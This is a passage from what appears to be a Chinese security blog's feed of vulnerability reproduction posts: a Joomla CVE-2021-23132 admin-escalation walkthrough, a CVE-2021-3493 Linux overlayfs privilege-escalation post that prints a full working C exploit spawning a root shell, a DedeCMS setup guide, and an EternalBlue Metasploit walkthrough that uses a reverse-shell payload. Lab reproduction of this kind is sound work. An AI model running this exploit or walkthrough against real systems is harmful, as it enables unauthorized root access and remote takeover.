      first&#x3D;&quot;0&quot;
      last&#x3D;&quot;98&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;0&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;minimum_uppercase&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_UPPERCASE&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_UPPERCASE_DESC&quot;
      first&#x3D;&quot;0&quot;
      last&#x3D;&quot;98&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;0&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;minimum_lowercase&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_LOWERCASE&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_LOWERCASE_DESC&quot;
      first&#x3D;&quot;0&quot;
      last&#x3D;&quot;98&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;0&quot;
    &#x2F;&gt;

  &lt;&#x2F;fieldset&gt;

  &lt;fieldset
    name&#x3D;&quot;user_notes_history&quot;
    label&#x3D;&quot;COM_USERS_CONFIG_FIELD_NOTES_HISTORY&quot; &gt;

    &lt;field
      name&#x3D;&quot;save_history&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;JGLOBAL_SAVE_HISTORY_OPTIONS_LABEL&quot;
      description&#x3D;&quot;JGLOBAL_SAVE_HISTORY_OPTIONS_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;0&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;history_limit&quot;
      type&#x3D;&quot;number&quot;
      label&#x3D;&quot;JGLOBAL_HISTORY_LIMIT_OPTIONS_LABEL&quot;
      description&#x3D;&quot;JGLOBAL_HISTORY_LIMIT_OPTIONS_DESC&quot;
      filter&#x3D;&quot;integer&quot;
      default&#x3D;&quot;5&quot;
      showon&#x3D;&quot;save_history:1&quot;
    &#x2F;&gt;

  &lt;&#x2F;fieldset&gt;

   &lt;fieldset
    name&#x3D;&quot;massmail&quot;
    label&#x3D;&quot;COM_USERS_MASS_MAIL&quot;
    description&#x3D;&quot;COM_USERS_MASS_MAIL_DESC&quot;&gt;

    &lt;field
       name&#x3D;&quot;mailSubjectPrefix&quot;
       type&#x3D;&quot;text&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_SUBJECT_PREFIX_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_SUBJECT_PREFIX_DESC&quot;
    &#x2F;&gt;

     &lt;field
       name&#x3D;&quot;mailBodySuffix&quot;
      type&#x3D;&quot;textarea&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MAILBODY_SUFFIX_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MAILBODY_SUFFIX_DESC&quot;
       rows&#x3D;&quot;5&quot;
       cols&#x3D;&quot;30&quot;
    &#x2F;&gt;

  &lt;&#x2F;fieldset&gt;

  &lt;fieldset
    name&#x3D;&quot;debug&quot;
    label&#x3D;&quot;COM_USERS_DEBUG_LABEL&quot;
    description&#x3D;&quot;COM_USERS_DEBUG_DESC&quot;&gt;

    &lt;field
      name&#x3D;&quot;debugUsers&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_DEBUG_USERS_LABEL&quot;
      description&#x3D;&quot;COM_USERS_DEBUG_USERS_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;debugGroups&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_DEBUG_GROUPS_LABEL&quot;
      description&#x3D;&quot;COM_USERS_DEBUG_GROUPS_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

  &lt;&#x2F;fieldset&gt;

  &lt;fieldset name&#x3D;&quot;integration&quot;
    label&#x3D;&quot;JGLOBAL_INTEGRATION_LABEL&quot;
    description&#x3D;&quot;COM_USERS_CONFIG_INTEGRATION_SETTINGS_DESC&quot;
  &gt;

    &lt;field
      name&#x3D;&quot;integration_sef&quot;
      type&#x3D;&quot;note&quot;
      label&#x3D;&quot;JGLOBAL_SEF_TITLE&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;sef_advanced&quot;
      type&#x3D;&quot;radio&quot;
      class&#x3D;&quot;btn-group btn-group-yesno btn-group-reversed&quot;
      default&#x3D;&quot;0&quot;
      label&#x3D;&quot;JGLOBAL_SEF_ADVANCED_LABEL&quot;
      description&#x3D;&quot;JGLOBAL_SEF_ADVANCED_DESC&quot;
      filter&#x3D;&quot;integer&quot;
      &gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JGLOBAL_SEF_ADVANCED_LEGACY&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JGLOBAL_SEF_ADVANCED_MODERN&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;integration_customfields&quot;
      type&#x3D;&quot;note&quot;
      label&#x3D;&quot;JGLOBAL_FIELDS_TITLE&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;custom_fields_enable&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;JGLOBAL_CUSTOM_FIELDS_ENABLE_LABEL&quot;
      description&#x3D;&quot;JGLOBAL_CUSTOM_FIELDS_ENABLE_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

  &lt;&#x2F;fieldset&gt;

  &lt;fieldset
    name&#x3D;&quot;permissions&quot;
    label&#x3D;&quot;JCONFIG_PERMISSIONS_LABEL&quot;
    description&#x3D;&quot;JCONFIG_PERMISSIONS_DESC&quot;
    &gt;

    &lt;field
      name&#x3D;&quot;rules&quot;
      type&#x3D;&quot;rules&quot;
      label&#x3D;&quot;JCONFIG_PERMISSIONS_LABEL&quot;
      filter&#x3D;&quot;rules&quot;
      validate&#x3D;&quot;rules&quot;
      component&#x3D;&quot;com_users&quot;
      section&#x3D;&quot;component&quot;
    &#x2F;&gt;

  &lt;&#x2F;fieldset&gt;
&lt;&#x2F;config&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"><br>这一步我自己复现的时候没有实现，再上传的时候提醒“不支持的文件类型”，之后发现在默认设置里加上.xml类型，还是会提醒“无效的MIME类型”，不知道是不是我搞的版本问题(●—●),上传不成功我还尝试直接从本地改文件，还是不行，我怀疑是不是网络流传的xml文件是错的。<br>唉不说了，复现都不成功，真的菜，按照其他大佬的文章，添加好xml文件以后，在普通管理员身份下，即可创建超级管理员用户了。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"><br>创建一个超级管理员，并登陆系统。登录系统后进入到模板管理。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br>然后在指定模板（默认beez3模板）下修改某个php文件内容。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt="图片"><br>例如这里修改error.php，并添加phpinfo的代码。然后访问：<a href="http://localhost/templates/beez3/error.php">http://localhost/templates/beez3/error.php</a> 可以看到成功执行了phpinfo，实现任意代码执行。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/16.png" alt="图片"></p>
<p>后面我还试了一下网上的POC，果然也是目录遍历没问题，但加xml文件那里就出问题了<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/18.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/19.png" alt="图片"><br>不过用POC的xml文件直接就给我搞出来个超级管理员用户，哈哈哈这算不算复现成功了呢<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20.png" alt="图片"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>当前最新版本为3.9.25，建议相关用户升级到3.9.25版本，已完全修复该漏洞。或者登陆系统后台，系统会提示升级，点击一下完成自动升级即可。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/17.png" alt="图片"></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://hackdig.com/03/hack-293705.htm">http://hackdig.com/03/hack-293705.htm</a><br><a href="https://www.venustech.com.cn/new_type/aqtg/20210310/22465.html">https://www.venustech.com.cn/new_type/aqtg/20210310/22465.html</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>2021.3</tag>
      </tags>
  </entry>
  <entry>
    <title>【CVE-2021-3493】Linux kernel权限提升漏洞复现</title>
    <url>/2021/04/25/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9ECVE-2021-3493%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>linux kernel一般指Linux内核。Linux是一种开源电脑操作系统内核。它是一个用C语言写成，符合POSIX标准的类Unix操作系统。<br>linux内核中的overlayfs文件系统中没有正确地验证用户名称空间和底层文件系统中文件功能的设置。由于非特权用户名称空间和Ubuntu内核中允许非特权覆盖的补丁的组合，攻击者可以使用它来获得更高的特权。</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Ubuntu 20.10<br>Ubuntu 20.04 LTS<br>Ubuntu 18.04 LTS<br>Ubuntu 16.04 LTS<br>Ubuntu 14.04 ESM</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre class="line-numbers language-none"><code class="language-none">uname -a              显示电脑以及操作系统的相关信息
cat &#x2F;etc&#x2F;issue        显示发行版本信息
cat &#x2F;proc&#x2F;version     显示正在运行的内核版本
lsb_release -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png" alt="图片"></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><pre class="line-numbers language-none"><code class="language-none">gcc exploit.c -o exploit     编译
chmod +x exploit             给执行权限
.&#x2F;exploit                    执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>可以看到前后权限有所提升，用户权限–&gt;管理员权限<br><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png" alt="图片"></p>
<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p><a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;exploit.c
#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;err.h&gt;
#include &lt;errno.h&gt;
#include &lt;sched.h&gt;
#include &lt;sys&#x2F;types.h&gt;
#include &lt;sys&#x2F;stat.h&gt;
#include &lt;sys&#x2F;wait.h&gt;
#include &lt;sys&#x2F;mount.h&gt;

&#x2F;&#x2F;#include &lt;attr&#x2F;xattr.h&gt;
&#x2F;&#x2F;#include &lt;sys&#x2F;xattr.h&gt;
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);


#define DIR_BASE    &quot;.&#x2F;ovlcap&quot;
#define DIR_WORK    DIR_BASE &quot;&#x2F;work&quot;
#define DIR_LOWER   DIR_BASE &quot;&#x2F;lower&quot;
#define DIR_UPPER   DIR_BASE &quot;&#x2F;upper&quot;
#define DIR_MERGE   DIR_BASE &quot;&#x2F;merge&quot;
#define BIN_MERGE   DIR_MERGE &quot;&#x2F;magic&quot;
#define BIN_UPPER   DIR_UPPER &quot;&#x2F;magic&quot;


static void xmkdir(const char *path, mode_t mode)
&#123;
    if (mkdir(path, mode) &#x3D;&#x3D; -1 &amp;&amp; errno !&#x3D; EEXIST)
        err(1, &quot;mkdir %s&quot;, path);
&#125;

static void xwritefile(const char *path, const char *data)
&#123;
    int fd &#x3D; open(path, O_WRONLY);
    if (fd &#x3D;&#x3D; -1)
        err(1, &quot;open %s&quot;, path);
    ssize_t len &#x3D; (ssize_t) strlen(data);
    if (write(fd, data, len) !&#x3D; len)
        err(1, &quot;write %s&quot;, path);
    close(fd);
&#125;

static void xcopyfile(const char *src, const char *dst, mode_t mode)
&#123;
    int fi, fo;

    if ((fi &#x3D; open(src, O_RDONLY)) &#x3D;&#x3D; -1)
        err(1, &quot;open %s&quot;, src);
    if ((fo &#x3D; open(dst, O_WRONLY | O_CREAT, mode)) &#x3D;&#x3D; -1)
        err(1, &quot;open %s&quot;, dst);

    char buf[4096];
    ssize_t rd, wr;

    for (;;) &#123;
        rd &#x3D; read(fi, buf, sizeof(buf));
        if (rd &#x3D;&#x3D; 0) &#123;
            break;
        &#125; else if (rd &#x3D;&#x3D; -1) &#123;
            if (errno &#x3D;&#x3D; EINTR)
                continue;
            err(1, &quot;read %s&quot;, src);
        &#125;

        char *p &#x3D; buf;
        while (rd &gt; 0) &#123;
            wr &#x3D; write(fo, p, rd);
            if (wr &#x3D;&#x3D; -1) &#123;
                if (errno &#x3D;&#x3D; EINTR)
                    continue;
                err(1, &quot;write %s&quot;, dst);
            &#125;
            p +&#x3D; wr;
            rd -&#x3D; wr;
        &#125;
    &#125;

    close(fi);
    close(fo);
&#125;

static int exploit()
&#123;
    char buf[4096];

    sprintf(buf, &quot;rm -rf &#39;%s&#x2F;&#39;&quot;, DIR_BASE);
    system(buf);

    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK,  0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);

    uid_t uid &#x3D; getuid();
    gid_t gid &#x3D; getgid();

    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) &#x3D;&#x3D; -1)
        err(1, &quot;unshare&quot;);

    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;setgroups&quot;, &quot;deny&quot;);

    sprintf(buf, &quot;0 %d 1&quot;, uid);
    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;uid_map&quot;, buf);

    sprintf(buf, &quot;0 %d 1&quot;, gid);
    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;gid_map&quot;, buf);

    sprintf(buf, &quot;lowerdir&#x3D;%s,upperdir&#x3D;%s,workdir&#x3D;%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) &#x3D;&#x3D; -1)
        err(1, &quot;mount %s&quot;, DIR_MERGE);

    &#x2F;&#x2F; all+ep
    char cap[] &#x3D; &quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;;

    xcopyfile(&quot;&#x2F;proc&#x2F;self&#x2F;exe&quot;, BIN_MERGE, 0777);
    if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) &#x3D;&#x3D; -1)
        err(1, &quot;setxattr %s&quot;, BIN_MERGE);

    return 0;
&#125;

int main(int argc, char *argv[])
&#123;
    if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) &#123;
        setuid(0);
        setgid(0);
        execl(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;&#x2F;bin&#x2F;bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL);
        err(1, &quot;execl &#x2F;bin&#x2F;bash&quot;);
    &#125;

    pid_t child &#x3D; fork();
    if (child &#x3D;&#x3D; -1)
        err(1, &quot;fork&quot;);

    if (child &#x3D;&#x3D; 0) &#123;
        _exit(exploit());
    &#125; else &#123;
        waitpid(child, NULL, 0);
    &#125;

    execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL);
    err(1, &quot;execl %s&quot;, BIN_UPPER);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>更新Linux内核至5.11</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw">https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw</a><br><a href="https://blog.csdn.net/Appleteachers/article/details/116018035">https://blog.csdn.net/Appleteachers/article/details/116018035</a></p>
]]></content>
      <categories>
        <category>Linux安全</category>
        <category>系统安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>2021.4</tag>
      </tags>
  </entry>
  <entry>
    <title>dedecms网站搭建</title>
    <url>/2021/01/21/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<ol>
<li>下载织梦开源程序</li>
</ol>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/1.png" alt="图片"></p>
<ol start="2">
<li>解压织梦程序安装包，将uploads里面所有的程序文件，复制粘贴到phpstudy的WWW文件夹里面。</li>
<li>访问127.0.0.1的DedeCMS网址</li>
</ol>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/2.png" alt="图片"></p>
<ol start="4">
<li>点击继续</li>
</ol>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/3.png" alt="图片"></p>
<ol start="5">
<li>点继续，进入参数配置页面，数据库主机：localhost，数据库用户：root，数据库密码：root，对于PHPstudy本地环境来说，这几项是固定的，在这里的数据库名称可以更改，也可以不更改。接着再自己设置一下用户名、密码、网站名称、管理员邮箱即可点击继续安装。</li>
</ol>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/4.png" alt="图片"></p>
<ol start="6">
<li>安装完成，登录网站后台</li>
</ol>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/5.png" alt="图片"></p>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/6.png" alt="图片"></p>
<ol start="7">
<li>登陆成功！</li>
</ol>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/7.png" alt="图片"></p>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/8.png" alt="图片"></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>环境搭建</category>
      </categories>
  </entry>
  <entry>
    <title>【MS17-010】永恒之蓝漏洞复现</title>
    <url>/2021/01/22/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
<h3 id="漏洞原理代码详解"><a href="#漏洞原理代码详解" class="headerlink" title="漏洞原理代码详解"></a>漏洞原理代码详解</h3><p><a href="http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772">http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772</a><br><a href="https://blog.csdn.net/qq_27446553/article/details/73480807">https://blog.csdn.net/qq_27446553/article/details/73480807</a></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>攻击机：kali-Linux-2019   192.168.141.133<br>靶机：Windows7 x64   192.168.141.136</p>
<p>我们可以利用kali-msf框架里收录的永恒之蓝漏洞环境来复现这个漏洞<br>命令打开工具：</p>
<pre class="line-numbers language-none"><code class="language-none">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>上面显示的是漏洞利用数和执行语句数量，接下来选择永恒之蓝的模块</p>
<pre class="line-numbers language-none"><code class="language-none">search ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>有如上几种漏洞利用，我们就选择其中一种</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"><br>然后查看一下有哪些利用语句（payload）</p>
<pre class="line-numbers language-none"><code class="language-none">show payloads<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br>我们选择其中一种执行语句</p>
<pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br>查看一下当前漏洞利用信息</p>
<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br>现在使用的这个漏洞利用是有反弹shell的攻击，RHOSTS就是靶机的ip地址，LHOST是反弹的地址，也就是我们的攻击机ip，把信息对应填入</p>
<pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.141.136
set LHOST 192.168.141.133<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br>设置完成再检测一下当前漏洞利用信息</p>
<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
